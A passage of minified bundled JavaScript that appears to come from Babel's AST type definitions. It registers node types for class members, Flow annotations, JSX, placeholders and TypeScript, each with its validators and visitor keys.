lder:["key","value","typeAnnotation","decorators","computed","static"],aliases:["Property"],fields:Object.assign({},UY(),{value:{validate:(0,T.assertNodeType)("Expression"),optional:!0},definite:{validate:(0,T.assertValueType)("boolean"),optional:!0},typeAnnotation:{validate:(0,T.assertNodeType)("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},decorators:{validate:(0,T.arrayOfType)("Decorator"),optional:!0},readonly:{validate:(0,T.assertValueType)("boolean"),optional:!0},declare:{validate:(0,T.assertValueType)("boolean"),optional:!0},variance:{validate:(0,T.assertNodeType)("Variance"),optional:!0}})});Z1("ClassAccessorProperty",{visitor:["decorators","key","typeAnnotation","value"],builder:["key","value","typeAnnotation","decorators","computed","static"],aliases:["Property","Accessor"],fields:Object.assign({},UY(),{key:{validate:(0,T.chain)(function(){let X=(0,T.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","PrivateName"),Q=(0,T.assertNodeType)("Expression");return function(J,Y,W){(J.computed?Q:X)(J,Y,W)}}(),(0,T.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","Expression","PrivateName"))},value:{validate:(0,T.assertNodeType)("Expression"),optional:!0},definite:{validate:(0,T.assertValueType)("boolean"),optional:!0},typeAnnotation:{validate:(0,T.assertNodeType)("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},decorators:{validate:(0,T.arrayOfType)("Decorator"),optional:!0},readonly:{validate:(0,T.assertValueType)("boolean"),optional:!0},declare:{validate:(0,T.assertValueType)("boolean"),optional:!0},variance:{validate:(0,T.assertNodeType)("Variance"),optional:!0}})});Z1("ClassPrivateProperty",{visitor:["decorators","variance","key","typeAnnotation","value"],builder:["key","value","decorators","static"],aliases:["Property","Private"],fields:{key:{validate:(0,T.assertNodeType)("PrivateName")},value:{validate:(0,T.assertNodeType)("Expression"),optional:!0},typeAnnotation:{validate:(0,T.assertNodeType)("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},decorators:{validate:(0,T.arrayOfType)("Decorator"),optional:!0},static:{validate:(0,T.assertValueType)("boolean"),default:!1},readonly:{validate:(0,T.assertValueType)("boolean"),optional:!0},optional:{validate:(0,T.assertValueType)("boolean"),optional:!0},definite:{validate:(0,T.assertValueType)("boolean"),optional:!0},variance:{validate:(0,T.assertNodeType)("Variance"),optional:!0}}});Z1("ClassPrivateMethod",{builder:["kind","key","params","body","static"],visitor:["decorators","key","typeParameters","params","returnType","body"],aliases:["Function","Scopable","BlockParent","FunctionParent","Method","Private"],fields:Object.assign({},Q$(),nX(),{kind:{validate:(0,T.assertOneOf)("get","set","method"),default:"method"},key:{validate:(0,T.assertNodeType)("PrivateName")},body:{validate:(0,T.assertNodeType)("BlockStatement")}})});Z1("PrivateName",{visitor:["id"],aliases:["Private"],fields:{id:{validate:(0,T.assertNodeType)("Identifier")}}});Z1("StaticBlock",{visitor:["body"],fields:{body:(0,T.validateArrayOfType)("Statement")},aliases:["Scopable","BlockParent","FunctionParent"]});Z1("ImportAttribute",{visitor:["key","value"],fields:{key:{validate:(0,T.assertNodeType)("Identifier","StringLiteral")},value:{validate:(0,T.assertNodeType)("StringLiteral")}}})});var Z3=m(()=>{var q3=g4(),l=o6(),b1=(0,l.defineAliasedType)("Flow"),J$=(X)=>{let Q=X==="DeclareClass";b1(X,{builder:["id","typeParameters","extends","body"],visitor:["id","typeParameters","extends",...Q?["mixins","implements"]:[],"body"],aliases:["FlowDeclaration","Statement","Declaration"],fields:Object.assign({id:(0,l.validateType)("Identifier"),typeParameters:(0,l.validateOptionalType)("TypeParameterDeclaration"),extends:(0,l.validateOptional)((0,l.arrayOfType)("InterfaceExtends"))},Q?{mixins:(0,l.validateOptional)((0,l.arrayOfType)("InterfaceExtends")),implements:(0,l.validateOptional)((0,l.arrayOfType)("ClassImplements"))}:{},{body:(0,l.validateType)("ObjectTypeAnnotation")})})};b1("AnyTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});b1("ArrayTypeAnnotation",{visitor:["elementType"],aliases:["FlowType"],fields:{elementType:(0,l.validateType)("FlowType")}});b1("BooleanTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});b1("BooleanLiteralTypeAnnotation",{builder:["value"],aliases:["FlowType"],fields:{value:(0,l.validate)((0,l.assertValueType)("boolean"))}});b1("NullLiteralTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});b1("ClassImplements",{visitor:["id","typeParameters"],fields:{id:(0,l.validateType)("Identifier"),typeParameters:(0,l.validateOptionalType)("TypeParameterInstantiation")}});J$("DeclareClass");b1("DeclareFunction",{builder:["id"],visitor:["id","predicate"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,l.validateType)("Identifier"),predicate:(0,l.validateOptionalType)("DeclaredPredicate")}});J$("DeclareInterface");b1("DeclareModule",{builder:["id","body","kind"],visitor:["id","body"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,l.validateType)("Identifier","StringLiteral"),body:(0,l.validateType)("BlockStatement"),kind:(0,l.validateOptional)((0,l.assertOneOf)("CommonJS","ES"))}});b1("DeclareModuleExports",{visitor:["typeAnnotation"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{typeAnnotation:(0,l.validateType)("TypeAnnotation")}});b1("DeclareTypeAlias",{visitor:["id","typeParameters","right"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,l.validateType)("Identifier"),typeParameters:(0,l.validateOptionalType)("TypeParameterDeclaration"),right:(0,l.validateType)("FlowType")}});b1("DeclareOpaqueType",{visitor:["id","typeParameters","supertype"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,l.validateType)("Identifier"),typeParameters:(0,l.validateOptionalType)("TypeParameterDeclaration"),supertype:(0,l.validateOptionalType)("FlowType"),impltype:(0,l.validateOptionalType)("FlowType")}});b1("DeclareVariable",{visitor:["id"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,l.validateType)("Identifier")}});b1("DeclareExportDeclaration",{visitor:["declaration","specifiers","source","attributes"],aliases:["FlowDeclaration","Statement","Declaration"],fields:Object.assign({declaration:(0,l.validateOptionalType)("Flow"),specifiers:(0,l.validateOptional)((0,l.arrayOfType)("ExportSpecifier","ExportNamespaceSpecifier")),source:(0,l.validateOptionalType)("StringLiteral"),default:(0,l.validateOptional)((0,l.assertValueType)("boolean"))},q3.importAttributes)});b1("DeclareExportAllDeclaration",{visitor:["source","attributes"],aliases:["FlowDeclaration","Statement","Declaration"],fields:Object.assign({source:(0,l.validateType)("StringLiteral"),exportKind:(0,l.validateOptional)((0,l.assertOneOf)("type","value"))},q3.importAttributes)});b1("DeclaredPredicate",{visitor:["value"],aliases:["FlowPredicate"],fields:{value:(0,l.validateType)("Flow")}});b1("ExistsTypeAnnotation",{aliases:["FlowType"]});b1("FunctionTypeAnnotation",{builder:["typeParameters","params","rest","returnType"],visitor:["typeParameters","this","params","rest","returnType"],aliases:["FlowType"],fields:{typeParameters:(0,l.validateOptionalType)("TypeParameterDeclaration"),params:(0,l.validateArrayOfType)("FunctionTypeParam"),rest:(0,l.validateOptionalType)("FunctionTypeParam"),this:(0,l.validateOptionalType)("FunctionTypeParam"),returnType:(0,l.validateType)("FlowType")}});b1("FunctionTypeParam",{visitor:["name","typeAnnotation"],fields:{name:(0,l.validateOptionalType)("Identifier"),typeAnnotation:(0,l.validateType)("FlowType"),optional:(0,l.validateOptional)((0,l.assertValueType)("boolean"))}});b1("GenericTypeAnnotation",{visitor:["id","typeParameters"],aliases:["FlowType"],fields:{id:(0,l.validateType)("Identifier","QualifiedTypeIdentifier"),typeParameters:(0,l.validateOptionalType)("TypeParameterInstantiation")}});b1("InferredPredicate",{aliases:["FlowPredicate"]});b1("InterfaceExtends",{visitor:["id","typeParameters"],fields:{id:(0,l.validateType)("Identifier","QualifiedTypeIdentifier"),typeParameters:(0,l.validateOptionalType)("TypeParameterInstantiation")}});J$("InterfaceDeclaration");b1("InterfaceTypeAnnotation",{visitor:["extends","body"],aliases:["FlowType"],fields:{extends:(0,l.validateOptional)((0,l.arrayOfType)("InterfaceExtends")),body:(0,l.validateType)("ObjectTypeAnnotation")}});b1("IntersectionTypeAnnotation",{visitor:["types"],aliases:["FlowType"],fields:{types:(0,l.validate)((0,l.arrayOfType)("FlowType"))}});b1("MixedTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});b1("EmptyTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});b1("NullableTypeAnnotation",{visitor:["typeAnnotation"],aliases:["FlowType"],fields:{typeAnnotation:(0,l.validateType)("FlowType")}});b1("NumberLiteralTypeAnnotation",{builder:["value"],aliases:["FlowType"],fields:{value:(0,l.validate)((0,l.assertValueType)("number"))}});b1("NumberTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});b1("ObjectTypeAnnotation",{visitor:["properties","indexers","callProperties","internalSlots"],aliases:["FlowType"],builder:["properties","indexers","callProperties","internalSlots","exact"],fields:{properties:(0,l.validate)((0,l.arrayOfType)("ObjectTypeProperty","ObjectTypeSpreadProperty")),indexers:{validate:(0,l.arrayOfType)("ObjectTypeIndexer"),optional:!0,default:[]},callProperties:{validate:(0,l.arrayOfType)("ObjectTypeCallProperty"),optional:!0,default:[]},internalSlots:{validate:(0,l.arrayOfType)("ObjectTypeInternalSlot"),optional:!0,default:[]},exact:{validate:(0,l.assertValueType)("boolean"),default:!1},inexact:(0,l.validateOptional)((0,l.assertValueType)("boolean"))}});b1("ObjectTypeInternalSlot",{visitor:["id","value"],builder:["id","value","optional","static","method"],aliases:["UserWhitespacable"],fields:{id:(0,l.validateType)("Identifier"),value:(0,l.validateType)("FlowType"),optional:(0,l.validate)((0,l.assertValueType)("boolean")),static:(0,l.validate)((0,l.assertValueType)("boolean")),method:(0,l.validate)((0,l.assertValueType)("boolean"))}});b1("ObjectTypeCallProperty",{visitor:["value"],aliases:["UserWhitespacable"],fields:{value:(0,l.validateType)("FlowType"),static:(0,l.validate)((0,l.assertValueType)("boolean"))}});b1("ObjectTypeIndexer",{visitor:["variance","id","key","value"],builder:["id","key","value","variance"],aliases:["UserWhitespacable"],fields:{id:(0,l.validateOptionalType)("Identifier"),key:(0,l.validateType)("FlowType"),value:(0,l.validateType)("FlowType"),static:(0,l.validate)((0,l.assertValueType)("boolean")),variance:(0,l.validateOptionalType)("Variance")}});b1("ObjectTypeProperty",{visitor:["key","value","variance"],aliases:["UserWhitespacable"],fields:{key:(0,l.validateType)("Identifier","StringLiteral"),value:(0,l.validateType)("FlowType"),kind:(0,l.validate)((0,l.assertOneOf)("init","get","set")),static:(0,l.validate)((0,l.assertValueType)("boolean")),proto:(0,l.validate)((0,l.assertValueType)("boolean")),optional:(0,l.validate)((0,l.assertValueType)("boolean")),variance:(0,l.validateOptionalType)("Variance"),method:(0,l.validate)((0,l.assertValueType)("boolean"))}});b1("ObjectTypeSpreadProperty",{visitor:["argument"],aliases:["UserWhitespacable"],fields:{argument:(0,l.validateType)("FlowType")}});b1("OpaqueType",{visitor:["id","typeParameters","supertype","impltype"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,l.validateType)("Identifier"),typeParameters:(0,l.validateOptionalType)("TypeParameterDeclaration"),supertype:(0,l.validateOptionalType)("FlowType"),impltype:(0,l.validateType)("FlowType")}});b1("QualifiedTypeIdentifier",{visitor:["qualification","id"],builder:["id","qualification"],fields:{id:(0,l.validateType)("Identifier"),qualification:(0,l.validateType)("Identifier","QualifiedTypeIdentifier")}});b1("StringLiteralTypeAnnotation",{builder:["value"],aliases:["FlowType"],fields:{value:(0,l.validate)((0,l.assertValueType)("string"))}});b1("StringTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});b1("SymbolTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});b1("ThisTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});b1("TupleTypeAnnotation",{visitor:["types"],aliases:["FlowType"],fields:{types:(0,l.validate)((0,l.arrayOfType)("FlowType"))}});b1("TypeofTypeAnnotation",{visitor:["argument"],aliases:["FlowType"],fields:{argument:(0,l.validateType)("FlowType")}});b1("TypeAlias",{visitor:["id","typeParameters","right"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,l.validateType)("Identifier"),typeParameters:(0,l.validateOptionalType)("TypeParameterDeclaration"),right:(0,l.validateType)("FlowType")}});b1("TypeAnnotation",{visitor:["typeAnnotation"],fields:{typeAnnotation:(0,l.validateType)("FlowType")}});b1("TypeCastExpression",{visitor:["expression","typeAnnotation"],aliases:["ExpressionWrapper","Expression"],fields:{expression:(0,l.validateType)("Expression"),typeAnnotation:(0,l.validateType)("TypeAnnotation")}});b1("TypeParameter",{visitor:["bound","default","variance"],fields:{name:(0,l.validate)((0,l.assertValueType)("string")),bound:(0,l.validateOptionalType)("TypeAnnotation"),default:(0,l.validateOptionalType)("FlowType"),variance:(0,l.validateOptionalType)("Variance")}});b1("TypeParameterDeclaration",{visitor:["params"],fields:{params:(0,l.validate)((0,l.arrayOfType)("TypeParameter"))}});b1("TypeParameterInstantiation",{visitor:["params"],fields:{params:(0,l.validate)((0,l.arrayOfType)("FlowType"))}});b1("UnionTypeAnnotation",{visitor:["types"],aliases:["FlowType"],fields:{types:(0,l.validate)((0,l.arrayOfType)("FlowType"))}});b1("Variance",{builder:["kind"],fields:{kind:(0,l.validate)((0,l.assertOneOf)("minus","plus"))}});b1("VoidTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});b1("EnumDeclaration",{aliases:["Statement","Declaration"],visitor:["id","body"],fields:{id:(0,l.validateType)("Identifier"),body:(0,l.validateType)("EnumBooleanBody","EnumNumberBody","EnumStringBody","EnumSymbolBody")}});b1("EnumBooleanBody",{aliases:["EnumBody"],visitor:["members"],fields:{explicitType:(0,l.validate)((0,l.assertValueType)("boolean")),members:(0,l.validateArrayOfType)("EnumBooleanMember"),hasUnknownMembers:(0,l.validate)((0,l.assertValueType)("boolean"))}});b1("EnumNumberBody",{aliases:["EnumBody"],visitor:["members"],fields:{explicitType:(0,l.validate)((0,l.assertValueType)("boolean")),members:(0,l.validateArrayOfType)("EnumNumberMember"),hasUnknownMembers:(0,l.validate)((0,l.assertValueType)("boolean"))}});b1("EnumStringBody",{aliases:["EnumBody"],visitor:["members"],fields:{explicitType:(0,l.validate)((0,l.assertValueType)("boolean")),members:(0,l.validateArrayOfType)("EnumStringMember","EnumDefaultedMember"),hasUnknownMembers:(0,l.validate)((0,l.assertValueType)("boolean"))}});b1("EnumSymbolBody",{aliases:["EnumBody"],visitor:["members"],fields:{members:(0,l.validateArrayOfType)("EnumDefaultedMember"),hasUnknownMembers:(0,l.validate)((0,l.assertValueType)("boolean"))}});b1("EnumBooleanMember",{aliases:["EnumMember"],builder:["id"],visitor:["id","init"],fields:{id:(0,l.validateType)("Identifier"),init:(0,l.validateType)("BooleanLiteral")}});b1("EnumNumberMember",{aliases:["EnumMember"],visitor:["id","init"],fields:{id:(0,l.validateType)("Identifier"),init:(0,l.validateType)("NumericLiteral")}});b1("EnumStringMember",{aliases:["EnumMember"],visitor:["id","init"],fields:{id:(0,l.validateType)("Identifier"),init:(0,l.validateType)("StringLiteral")}});b1("EnumDefaultedMember",{aliases:["EnumMember"],visitor:["id"],fields:{id:(0,l.validateType)("Identifier")}});b1("IndexedAccessType",{visitor:["objectType","indexType"],aliases:["FlowType"],fields:{objectType:(0,l.validateType)("FlowType"),indexType:(0,l.validateType)("FlowType")}});b1("OptionalIndexedAccessType",{visitor:["objectType","indexType"],aliases:["FlowType"],fields:{objectType:(0,l.validateType)("FlowType"),indexType:(0,l.validateType)("FlowType"),optional:(0,l.validate)((0,l.assertValueType)("boolean"))}})});var M3=m(()=>{var g0=o6(),S9=(0,g0.defineAliasedType)("JSX");S9("JSXAttribute",{visitor:["name","value"],aliases:["Immutable"],fields:{name:{validate:(0,g0.assertNodeType)("JSXIdentifier","JSXNamespacedName")},value:{optional:!0,validate:(0,g0.assertNodeType)("JSXElement","JSXFragment","StringLiteral","JSXExpressionContainer")}}});S9("JSXClosingElement",{visitor:["name"],aliases:["Immutable"],fields:{name:{validate:(0,g0.assertNodeType)("JSXIdentifier","JSXMemberExpression","JSXNamespacedName")}}});S9("JSXElement",{builder:["openingElement","closingElement","children","selfClosing"],visitor:["openingElement","children","closingElement"],aliases:["Immutable","Expression"],fields:Object.assign({openingElement:{validate:(0,g0.assertNodeType)("JSXOpeningElement")},closingElement:{optional:!0,validate:(0,g0.assertNodeType)("JSXClosingElement")},children:(0,g0.validateArrayOfType)("JSXText","JSXExpressionContainer","JSXSpreadChild","JSXElement","JSXFragment")},{selfClosing:{validate:(0,g0.assertValueType)("boolean"),optional:!0}})});S9("JSXEmptyExpression",{});S9("JSXExpressionContainer",{visitor:["expression"],aliases:["Immutable"],fields:{expression:{validate:(0,g0.assertNodeType)("Expression","JSXEmptyExpression")}}});S9("JSXSpreadChild",{visitor:["expression"],aliases:["Immutable"],fields:{expression:{validate:(0,g0.assertNodeType)("Expression")}}});S9("JSXIdentifier",{builder:["name"],fields:{name:{validate:(0,g0.assertValueType)("string")}}});S9("JSXMemberExpression",{visitor:["object","property"],fields:{object:{validate:(0,g0.assertNodeType)("JSXMemberExpression","JSXIdentifier")},property:{validate:(0,g0.assertNodeType)("JSXIdentifier")}}});S9("JSXNamespacedName",{visitor:["namespace","name"],fields:{namespace:{validate:(0,g0.assertNodeType)("JSXIdentifier")},name:{validate:(0,g0.assertNodeType)("JSXIdentifier")}}});S9("JSXOpeningElement",{builder:["name","attributes","selfClosing"],visitor:["name","typeParameters","typeArguments","attributes"],aliases:["Immutable"],fields:Object.assign({name:{validate:(0,g0.assertNodeType)("JSXIdentifier","JSXMemberExpression","JSXNamespacedName")},selfClosing:{default:!1},attributes:(0,g0.validateArrayOfType)("JSXAttribute","JSXSpreadAttribute"),typeArguments:{validate:(0,g0.assertNodeType)("TypeParameterInstantiation"),optional:!0}},{typeParameters:{validate:(0,g0.assertNodeType)("TSTypeParameterInstantiation"),optional:!0}})});S9("JSXSpreadAttribute",{visitor:["argument"],fields:{argument:{validate:(0,g0.assertNodeType)("Expression")}}});S9("JSXText",{aliases:["Immutable"],builder:["value"],fields:{value:{validate:(0,g0.assertValueType)("string")}}});S9("JSXFragment",{builder:["openingFragment","closingFragment","children"],visitor:["openingFragment","children","closingFragment"],aliases:["Immutable","Expression"],fields:{openingFragment:{validate:(0,g0.assertNodeType)("JSXOpeningFragment")},closingFragment:{validate:(0,g0.assertNodeType)("JSXClosingFragment")},children:(0,g0.validateArrayOfType)("JSXText","JSXExpressionContainer","JSXSpreadChild","JSXElement","JSXFragment")}});S9("JSXOpeningFragment",{aliases:["Immutable"]});S9("JSXClosingFragment",{aliases:["Immutable"]})});var G$=m((j3)=>{Object.defineProperty(j3,"__esModule",{value:!0});j3.PLACEHOLDERS_FLIPPED_ALIAS=j3.PLACEHOLDERS_ALIAS=j3.PLACEHOLDERS=void 0;var oa=o6(),sa=j3.PLACEHOLDERS=["Identifier","StringLiteral","Expression","Statement","Declaration","BlockStatement","ClassBody","Pattern"],W$=j3.PLACEHOLDERS_ALIAS={Declaration:["Statement"],Pattern:["PatternLike","LVal"]};for(let X of sa){let Q=oa.ALIAS_KEYS[X];if(Q!=null&&Q.length)W$[X]=Q}var Y$=j3.PLACEHOLDERS_FLIPPED_ALIAS={};Object.keys(W$).forEach((X)=>{W$[X].forEach((Q)=>{if(!hasOwnProperty.call(Y$,Q))Y$[Q]=[];Y$[Q].push(X)})})});var O3=m(()=>{var KY=o6(),Xo=G$(),Qo=g4(),H$=(0,KY.defineAliasedType)("Miscellaneous");H$("Noop",{visitor:[]});H$("Placeholder",{visitor:[],builder:["expectedNode","name"],fields:Object.assign({name:{validate:(0,KY.assertNodeType)("Identifier")},expectedNode:{validate:(0,KY.assertOneOf)(...Xo.PLACEHOLDERS)}},(0,Qo.patternLikeCommon)())});H$("V8IntrinsicIdentifier",{builder:["name"],fields:{name:{validate:(0,KY.assertValueType)("string")}}})});var A3=m(()=>{var E0=o6();(0,E0.default)("ArgumentPlaceholder",{});(0,E0.default)("BindExpression",{visitor:["object","callee"],aliases:["Expression"],fields:!process.env.BABEL_TYPES_8_BREAKING?{object:{validate:Object.assign(()=>{},{oneOfNodeTypes:["Expression"]})},callee:{validate:Object.assign(()=>{},{oneOfNodeTypes:["Expression"]})}}:{object:{validate:(0,E0.assertNodeType)("Expression")},callee:{validate:(0,E0.assertNodeType)("Expression")}}});(0,E0.default)("Decorator",{visitor:["expression"],fields:{expression:{validate:(0,E0.assertNodeType)("Expression")}}});(0,E0.default)("DoExpression",{visitor:["body"],builder:["body","async"],aliases:["Expression"],fields:{body:{validate:(0,E0.assertNodeType)("BlockStatement")},async:{validate:(0,E0.assertValueType)("boolean"),default:!1}}});(0,E0.default)("ExportDefaultSpecifier",{visitor:["exported"],aliases:["ModuleSpecifier"],fields:{exported:{validate:(0,E0.assertNodeType)("Identifier")}}});(0,E0.default)("RecordExpression",{visitor:["properties"],aliases:["Expression"],fields:{properties:(0,E0.validateArrayOfType)("ObjectProperty","SpreadElement")}});(0,E0.default)("TupleExpression",{fields:{elements:{validate:(0,E0.arrayOfType)("Expression","SpreadElement"),default:[]}},visitor:["elements"],aliases:["Expression"]});(0,E0.default)("DecimalLiteral",{builder:["value"],fields:{value:{validate:(0,E0.assertValueType)("string")}},aliases:["Expression","Pureish","Literal","Immutable"]});(0,E0.default)("ModuleExpression",{visitor:["body"],fields:{body:{validate:(0,E0.assertNodeType)("Program")}},aliases:["Expression"]});(0,E0.default)("TopicReference",{aliases:["Expression"]});(0,E0.default)("PipelineTopicExpression",{builder:["expression"],visitor:["expression"],fields:{expression:{validate:(0,E0.assertNodeType)("Expression")}},aliases:["Expression"]});(0,E0.default)("PipelineBareFunction",{builder:["callee"],visitor:["callee"],fields:{callee:{validate:(0,E0.assertNodeType)("Expression")}},aliases:["Expression"]});(0,E0.default)("PipelinePrimaryTopicReference",{aliases:["Expression"]});(0,E0.default)("VoidPattern",{aliases:["Pattern","PatternLike","FunctionParameter"]})});var P3=m(()=>{var G1=o6(),R3=g4(),Jo=H5(),p1=(0,G1.defineAliasedType)("TypeScript"),m9=(0,G1.assertValueType)("boolean"),L3=()=>({returnType:{validate:(0,G1.assertNodeType)("TSTypeAnnotation","Noop"),optional:!0},typeParameters:{validate:(0,G1.assertNodeType)("TSTypeParameterDeclaration","Noop"),optional:!0}});p1("TSParameterProperty",{aliases:["LVal"],visitor:["parameter"],fields:{accessibility:{validate:(0,G1.assertOneOf)("public","private","protected"),optional:!0},readonly:{validate:(0,G1.assertValueType)("boolean"),optional:!0},parameter:{validate:(0,G1.assertNodeType)("Identifier","AssignmentPattern")},override:{validate:(0,G1.assertValueType)("boolean"),optional:!0},decorators:{validate:(0,G1.arrayOfType)("Decorator"),optional:!0}}});p1("TSDeclareFunction",{aliases:["Statement","Declaration"],visitor:["id","typeParameters","params","returnType"],fields:Object.assign({},(0,R3.functionDeclarationCommon)(),L3())});p1("TSDeclareMethod",{visitor:["decorators","key","typeParameters","params","returnType"],fields:Object.assign({},(0,R3.classMethodOrDeclareMethodCommon)(),L3())});p1("TSQualifiedName",{aliases:["TSEntityName"],visitor:["left","right"],fields:{left:(0,G1.validateType)("TSEntityName"),right:(0,G1.validateType)("Identifier")}});var VY=()=>({typeParameters:(0,G1.validateOptionalType)("TSTypeParameterDeclaration"),["parameters"]:(0,G1.validateArrayOfType)("ArrayPattern","Identifier","ObjectPattern","RestElement"),["typeAnnotation"]:(0,G1.validateOptionalType)("TSTypeAnnotation")}),D3={aliases:["TSTypeElement"],visitor:["typeParameters","parameters","typeAnnotation"],fields:VY()};p1("TSCallSignatureDeclaration",D3);p1("TSConstructSignatureDeclaration",D3);var N3=()=>({key:(0,G1.validateType)("Expression"),computed:{default:!1},optional:(0,G1.validateOptional)(m9)});p1("TSPropertySignature",{aliases:["TSTypeElement"],visitor:["key","typeAnnotation"],fields:Object.assign({},N3(),{readonly:(0,G1.validateOptional)(m9),typeAnnotation:(0,G1.validateOptionalType)("TSTypeAnnotation"),kind:{optional:!0,validate:(0,G1.assertOneOf)("get","set")}})});p1("TSMethodSignature",{aliases:["TSTypeElement"],visitor:["key","typeParameters","parameters","typeAnnotation"],fields:Object.assign({},VY(),N3(),{kind:{validate:(0,G1.assertOneOf)("method","get","set")}})});p1("TSIndexSignature",{aliases:["TSTypeElement"],visitor:["parameters","typeAnnotation"],fields:{readonly:(0,G1.validateOptional)(m9),static:(0,G1.validateOptional)(m9),parameters:(0,G1.validateArrayOfType)("Identifier"),typeAnnotation:(0,G1.validateOptionalType)("TSTypeAnnotation")}});var Yo=["TSAnyKeyword","TSBooleanKeyword","TSBigIntKeyword","TSIntrinsicKeyword","TSNeverKeyword","TSNullKeyword","TSNumberKeyword","TSObjectKeyword","TSStringKeyword","TSSymbolKeyword","TSUndefinedKeyword","TSUnknownKeyword","TSVoidKeyword"];for(let X of Yo)p1(X,{aliases:["TSType","TSBaseType"],visitor:[],fields:{}});p1("TSThisType",{aliases:["TSType","TSBaseType"],visitor:[],fields:{}});var w3={aliases:["TSType"],visitor:["typeParameters","parameters","typeAnnotation"]};p1("TSFunctionType",Object.assign({},w3,{fields:VY()}));p1("TSConstructorType",Object.assign({},w3,{fields:Object.assign({},VY(),{abstract:(0,G1.validateOptional)(m9)})}));p1("TSTypeReference",{aliases:["TSType"],visitor:["typeName","typeParameters"],fields:{typeName:(0,G1.validateType)("TSEntityName"),["typeParameters"]:(0,G1.validateOptionalType)("TSTypeParameterInstantiation")}});p1("TSTypePredicate",{aliases:["TSType"],visitor:["parameterName","typeAnnotation"],builder:["parameterName","typeAnnotation","asserts"],fields:{parameterName:(0,G1.validateType)("Identifier","TSThisType"),typeAnnotation:(0,G1.validateOptionalType)("TSTypeAnnotation"),asserts:(0,G1.validateOptional)(m9)}});p1("TSTypeQuery",{aliases:["TSType"],visitor:["exprName","typeParameters"],fields:{exprName:(0,G1.validateType)("TSEntityName","TSImportType"),["typeParameters"]:(0,G1.validateOptionalType)("TSTypeParameterInstantiation")}});p1("TSTypeLiteral",{aliases:["TSType"],visitor:["members"],fields:{members:(0,G1.validateArrayOfType)("TSTypeElement")}});p1("TSArrayType",{aliases:["TSType"],visitor:["elementType"],fields:{elementType:(0,G1.validateType)("TSType")}});p1("TSTupleType",{aliases:["TSType"],visitor:["elementTypes"],fields:{elementTypes:(0,G1.validateArrayOfType)("TSType","TSNamedTupleMember")}});p1("TSOptionalType",{aliases:["TSType"],visitor:["typeAnnotation"],fields:{typeAnnotation:(0,G1.validateType)("TSType")}});p1("TSRestType",{aliases:["TSType"],visitor:["typeAnnotation"],fields:{typeAnnotation:(0,G1.validateType)("TSType")}});p1("TSNamedTupleMember",{visitor:["label","elementType"],builder:["label","elementType","optional"],fields:{label:(0,G1.validateType)("Identifier"),optional:{validate:m9,default:!1},elementType:(0,G1.validateType)("TSType")}});var I3={aliases:["TSType"],visitor:["types"],fields:{types:(0,G1.validateArrayOfType)("TSType")}};p1("TSUnionType",I3);p1("TSIntersectionType",I3);p1("TSConditionalType",{aliases:["TSType"],visitor:["checkType","extendsType","trueType","falseType"],fields:{checkType:(0,G1.validateType)("TSType"),extendsType:(0,G1.validateType)("TSType"),trueType:(0,G1.validateType)("TSType"),falseType:(0,G1.validateType)("TSType")}});p1("TSInferType",{aliases:["TSType"],visitor:["typeParameter"],fields:{typeParameter:(0,G1.validateType)("TSTypeParameter")}});p1("TSParenthesizedType",{aliases:["TSType"],visitor:["typeAnnotation"],fields:{typeAnnotation:(0,G1.validateType)("TSType")}});p1("TSTypeOperator",{aliases:["TSType"],visitor:["typeAnnotation"],builder:["typeAnnotation","operator"],fields:{operator:{validate:(0,G1.assertValueType)("string"),default:"keyof"},typeAnnotation:(0,G1.validateType)("TSType")}});p1("TSIndexedAccessType",{aliases:["TSType"],visitor:["objectType","indexType"],fields:{objectType:(0,G1.validateType)("TSType"),indexType:(0,G1.validateType)("TSType")}});p1("TSMappedType",{aliases:["TSType"],visitor:["typeParameter","nameType","typeAnnotation"],builder:["typeParameter","typeAnnotation","nameType"],fields:Object.assign({},{typeParameter:(0,G1.validateType)("TSTypeParameter")},{readonly:(0,G1.validateOptional)((0,G1.assertOneOf)(!0,!1,"+","-")),optional:(0,G1.validateOptional)((0,G1.assertOneOf)(!0,!1,"+","-")),typeAnnotation:(0,G1.validateOptionalType)("TSType"),nameType:(0,G1.validateOptionalType)("TSType")})});p1("TSTemplateLiteralType",{aliases:["TSType","TSBaseType"],visitor:["quasis","types"],fields:{quasis:(0,G1.validateArrayOfType)("TemplateElement"),types:{validate:(0,G1.chain)((0,G1.assertValueType)("array"),(0,G1.assertEach)((0,G1.assertNodeType)("TSType")),function(X,Q,J){if(X.quasis.length!==J.length+1)throw TypeError(`Number of ${X.type} quasis should be exactly one more than the number of types.
